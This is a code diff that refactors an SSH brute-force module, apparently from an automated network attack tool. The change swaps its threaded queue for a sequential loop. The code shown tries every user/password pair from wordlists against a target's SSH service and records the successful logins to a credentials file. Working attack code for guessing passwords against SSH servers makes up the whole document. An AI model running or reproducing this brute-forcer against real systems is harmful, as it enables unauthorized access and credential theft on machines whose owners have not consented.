@@ -7,9 +7,7 @@ import time
 import pandas as pd
 import paramiko
 import socket
-import threading
 import logging
-from queue import Queue, Empty
 from rich.console import Console
 from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from shared import SharedData
@@ -104,7 +102,6 @@ class SSHConnector:
         self.users = open(shared_data.usersfile, "r").read().splitlines()
         self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()
 
-        self.lock = threading.Lock()
         self.sshfile = shared_data.sshfile
         if not os.path.exists(self.sshfile):
             logger.info(f"File {self.sshfile} does not exist. Creating...")
@@ -112,7 +109,6 @@ class SSHConnector:
                 f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
         self.results = []  # Successful credentials for the current bruteforce run
         self._pending_results = []  # Entries waiting to be flushed to disk
-        self.queue = Queue()
         self.console = Console()
 
     def load_scan_file(self):
@@ -153,7 +149,7 @@ class SSHConnector:
                 return False
             except (socket.error, paramiko.SSHException, EOFError) as exc:
                 if attempt < max_retries - 1:
-                    delay = 2 ** attempt  # 1s, 2s backoff
+                    delay = 2 + attempt * 2  # 2s, 4s backoff
                     logger.debug(f"SSH banner/connection error to {adresse_ip} (attempt {attempt+1}/{max_retries}), retrying in {delay}s: {exc}")
                     time.sleep(delay)
                 else:
@@ -161,41 +157,6 @@ class SSHConnector:
                     return False
             finally:
                 ssh.close()
-
-    def worker(self, progress, task_id, success_flag):
-        """
-        Worker thread to process items in the queue.
-        """
-        while True:
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping worker thread.")
-                break
-
-            if success_flag[0]:
-                break
-
-            try:
-                adresse_ip, user, password, mac_address, hostname, port = self.queue.get(timeout=0.5)
-            except Empty:
-                break
-
-            if self.ssh_connect(adresse_ip, user, password):
-                with self.lock:
-                    entry = [mac_address, adresse_ip, hostname, user, password, port]
-                    self.results.append(entry)
-                    self._pending_results.append(entry)
-                    logger.success(
-                        f"Found SSH credentials -> IP: {adresse_ip} | User: {user} | Password: {password}"
-                    )
-                    self.save_results()
-                    if not success_flag[0]:
-                        success_flag[0] = True
-                        self._clear_queue()
-            self.queue.task_done()
-            progress.update(task_id, advance=1)
-            # Small delay between attempts to avoid overwhelming the SSH daemon
-            time.sleep(0.5)
-
 
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
@@ -212,55 +173,38 @@ class SSHConnector:
         mac_address = ip_rows['MAC Address'].values[0]
         hostname = ip_rows['Hostnames'].values[0]
 
-        total_tasks = len(self.users) * len(self.passwords)
-        
-        for user in self.users:
-            for password in self.passwords:
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                    return False, []
-                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
+        # Build credential list
+        cred_list = [(user, password) for user in self.users for password in self.passwords]
+        total_tasks = len(cred_list)
+        success = False
 
-        success_flag = [False]
-        threads = []
-        
         with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
             task_id = progress.add_task("[cyan]Bruteforcing SSH...", total=total_tasks)
-            
-            for _ in range(2):  # Keep low to avoid overwhelming SSH daemons (MaxStartups)
-                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
-                t.start()
-                threads.append(t)
 
-            while not self.queue.empty():
+            for user, password in cred_list:
                 if self.shared_data.orchestrator_should_exit:
                     logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                    while not self.queue.empty():
-                        self.queue.get()
-                        self.queue.task_done()
                     break
 
-            self.queue.join()
+                if self.ssh_connect(adresse_ip, user, password):
+                    entry = [mac_address, adresse_ip, hostname, user, password, port]
+                    self.results.append(entry)
+                    self._pending_results.append(entry)
+                    logger.success(
+                        f"Found SSH credentials -> IP: {adresse_ip} | User: {user} | Password: {password}"
+                    )
+                    self.save_results()
+                    success = True
+                    progress.update(task_id, completed=total_tasks)
+                    break
 
-            for t in threads:
-                t.join()
+                progress.update(task_id, advance=1)
 
-        # Final flush/dedup after all threads complete to guarantee persistence
-        with self.lock:
-            self.save_results()
-            self.removeduplicates()
+        # Final flush/dedup after completion
+        self.save_results()
+        self.removeduplicates()
 
-        return success_flag[0], list(self.results)
-
-    def _clear_queue(self):
-        """Remove remaining queued tasks once credentials succeed."""
-        while not self.queue.empty():
-            try:
-                self.queue.get_nowait()
-                self.queue.task_done()
-            except Empty:
-                break
-
+        return success, list(self.results)
 
     def save_results(self):
         """Persist pending successful connection attempts to disk."""
